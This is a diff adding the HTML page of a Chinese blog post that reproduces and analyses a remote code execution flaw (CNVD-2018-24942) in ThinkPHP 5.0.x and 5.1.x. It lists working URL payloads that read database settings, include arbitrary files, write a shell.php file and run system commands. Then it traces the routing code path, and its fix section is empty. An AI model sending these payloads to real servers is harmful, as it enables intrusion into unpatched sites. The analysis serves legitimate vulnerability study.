@@ -1,0 +1,447 @@
+
+
+<!DOCTYPE html>
+<html lang="cn" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>ThinkPHP 5.0.x 未开启强制路由导致的RCE - Source Blog</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="ThinkPHP 5.0.x 未开启强制路由导致的RC...">
+  <meta name="author" content="source">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '心之所动，就随风去吧。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">ThinkPHP 5.0.x 未开启强制路由导致的RCE</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/sandbox.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">ThinkPHP 5.0.x 未开启强制路由导致的RCE</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>December 16, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2916</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h1 id="ThinkPHP-5-0-x-未开启强制路由导致的RCE"><a href="#ThinkPHP-5-0-x-未开启强制路由导致的RCE" class="headerlink" title="ThinkPHP 5.0.x 未开启强制路由导致的RCE"></a>ThinkPHP 5.0.x 未开启强制路由导致的RCE</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>主机：win10</p>
+<p>php 5.4</p>
+<p>apache</p>
+<p>Thinkphp5.0.8_full</p>
+<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>受影响版本：Thinkphp5.0.5-5.0.22</p>
+<p>​      Thinkpho5.1.0-5.1.30</p>
+<p>漏洞编号：CNVD-2018-24942</p>
+<p>thinkphp默认没有开启强制路由，而且默认开启路由兼容模式。使用兼容模式来调用控制器，当没有对控制器过滤时，我们可以调用任意的方法来执行.</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><h3 id="5-0-x"><a href="#5-0-x" class="headerlink" title="5.0.x"></a>5.0.x</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\config/get&amp;name=database.username # 获取配置信息</span><br><span class="line"></span><br><span class="line">?s=index/\think\Lang/load&amp;file=../../test.jpg  # 包含任意文件</span><br><span class="line"></span><br><span class="line">?s=index/\think\Config/load&amp;file=../../t.php   # 包含任意.php文件</span><br><span class="line"></span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-1-x"><a href="#5-1-x" class="headerlink" title="5.1.x"></a>5.1.x</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd</span><br><span class="line"></span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line"></span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://s2.loli.net/2021/12/15/Aan6P7q3XHkKVdv.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p><img    class="lazyload" data-original="https://s2.loli.net/2021/12/15/cIOFbtKDAw6CVdq.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>  首先定位到/application/config.php看一下URL设置，默认关闭强制路由且路由是开启的，看一下说明手册。</p>
+<p>  <img    class="lazyload" data-original="https://s2.loli.net/2021/12/15/Tz2kqJZujxC365h.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>说明手册的描述：</p>
+<p><img    class="lazyload" data-original="https://s2.loli.net/2021/12/15/pq2iMbrVsR1uynT.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>然后有点没看懂，接着去看URL设计的说明：</p>
+<p><img    class="lazyload" data-original="https://s2.loli.net/2021/12/15/TH2GVtI38xD7z1n.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>也就是说我们可以用s参数调用模块控制器和方法，而当框架对控制器名没有检测时，就有可能存在调用随意的控制器以及方法，就有可能存在RCE漏洞。</p>
+<p>开始审计：首先打开/public/index.php<img    class="lazyload" data-original="https://s2.loli.net/2021/12/15/5DPSHs1k89nVrqZ.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>跟到start.php</p>
+<p><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image014.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>全局搜索App，发现App类的文件路径/library/think/App.php跟进找到run()方法<img    class="lazyload" data-original="https://s2.loli.net/2021/12/15/SjORnqv9e4MNQLs.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>找到路由检测，$dispatch默认为空,进入路由检查。</p>
+<p><img    class="lazyload" data-original="https://s2.loli.net/2021/12/15/ghBjPyXIYuekHOn.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span>跟进 /library/think/App.php中的routeCheck()</p>
+<p><img    class="lazyload" data-original="https://s2.loli.net/2021/12/15/BhIt9Ng5JjqYbed.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>继续跟进/library/think/Request.php 中的path()方法：</p>
+<p><img    class="lazyload" data-original="https://s2.loli.net/2021/12/15/86XqWfb7tgwL5Fd.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>发现path由pathinfo()得来跟进看一下<img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image024.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>发现”var_pathinfo”即s传参被$_SERVER方式获取并被返回。</p>
+<p>回到/library/think/App.php 继续回去看routeCheck()方法，检测了路由<img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image026.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>如果开启强制路由则会报错退出。但是没开启就会返回$result回run方法。</p>
+<p>这里看一下返回的数据<img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image028.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span> <img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image030.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>返回的也就是一个二维数组</p>
+<p>[‘type’:’module’,  ’moudle’:[‘index’, ‘think\config’, ‘get’]]</p>
+<p>返回run()进入dispatch方法<img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image032.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>做了一个键值定义，继续往下走<img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image034.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>看到exec()方法跟进，type是module符合第二个case</p>
+<p><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image036.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>跟进/thinkphp/library/think/App.php module函数</p>
+<p>发现这个module获取控制器名、方法名、执行操作</p>
+<p><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image037.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image039.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>看一下387行的$instance是啥跟进/thinkphp/library/think/Loader.php contrller先对返回一个$class 也就是think\config</p>
+<p><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image040.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image042.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>跟进invokeClass</p>
+<p><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image043.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image045.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>ReflectionClass::newInstance 从指定参数创建一个新的类实例。通过反射方式调用think\config中的方法get</p>
+<p><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image047.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>call的值为array(2) { [0]=&gt; object(think\Config)#4 (0) { } [1]=&gt; string(3) “get” }</p>
+<p>跟进invokeMethod() ReflectionMethod::invokeArgs  带参数执行</p>
+<p><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image049.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>例如/think/Config.php中的get方法</p>
+<p><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image051.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<p>指定$name的值就会执行并返回结果</p>
+<p>也就是payload</p>
+<p>?s=index/think\config/get&amp;name=database.username # 获取配置信息的由来</p>
+<p>最终输出响应完成RCE。</p>
+<p><img    class="lazyload" data-original="C:/Windows/TEMP/msohtmlclip1/01/clip_image053.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span></p>
+<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1、 PHP ltrim() 函数 移除字符串左侧的空白字符或其他预定义字符。</p>
+<p>语法:ltrim(string,charlist)</p>
+<p>charlist可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：”\0” – NULL “\t” - 制表符” \n” - 换行  “\x0B” - 垂直制表符  “\r” - 回车  “ “ - 空格</p>
+<p>$str = “Hello World!”;</p>
+<p>echo ltrim($str,”Hello”);</p>
+<p>回显：World!</p>
+<p>2、 要通过反射机制调用某个类的方法，主要用到了下面这个方法：</p>
+<p>public Object invoke(Object obj,Object… args)</p>
+<p>这个方法对带有指定参数的指定对象调用由此 Method 对象表示的底层方法。个别参数被自动解包，以便与基本形参相匹配，基本参数和引用参数都随需服从方法调用转换。</p>
+<p>反射在 PHP 中的应用：<a target="_blank" rel="noopener" href="https://learnku.com/articles/7538/the-application-of-reflection-in-php">https://learnku.com/articles/7538/the-application-of-reflection-in-php</a></p>
+<p>  3、PHP is_callable() 函数 </p>
+<p>is_callable() 函数用于检测函数在当前环境中是否可调用。</p>
+<p>4、 PHP strpos() 函数</p>
+<p>查找 “php” 在字符串中第一次出现的位置：</p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>source</li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2021/12/16/ThinkPHP%205.0.x%20%E6%9C%AA%E5%BC%80%E5%90%AF%E5%BC%BA%E5%88%B6%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%87%B4%E7%9A%84RCE/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;12&#x2F;16&#x2F;ThinkPHP%205.0.x%20%E6%9C%AA%E5%BC%80%E5%90%AF%E5%BC%BA%E5%88%B6%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%87%B4%E7%9A%84RCE&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;12&#x2F;16&#x2F;ThinkPHP%205.0.x%20%E6%9C%AA%E5%BC%80%E5%90%AF%E5%BC%BA%E5%88%B6%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%87%B4%E7%9A%84RCE&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2021/12/16/ThinkPHP%205.x%20%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"><i class="iconfont iconleft"></i>ThinkPHP 5.x 变量覆盖导致的文件包含&任意代码执行</a>
+    <a href="/2021/12/16/ThinkPHP%205%20%E6%A0%B8%E5%BF%83%E7%B1%BB%20Request%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 5 核心类 Request 远程代码漏洞分析<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-5-0-x-%E6%9C%AA%E5%BC%80%E5%90%AF%E5%BC%BA%E5%88%B6%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%87%B4%E7%9A%84RCE"><span class="toc-text">ThinkPHP 5.0.x 未开启强制路由导致的RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">使用场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-text">payload:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-0-x"><span class="toc-text">5.0.x</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-x"><span class="toc-text">5.1.x</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-text">修复方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B6%89%E5%8F%8A%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">涉及知识点</span></a></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=87602307 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/87602307 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:87602307@qq.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
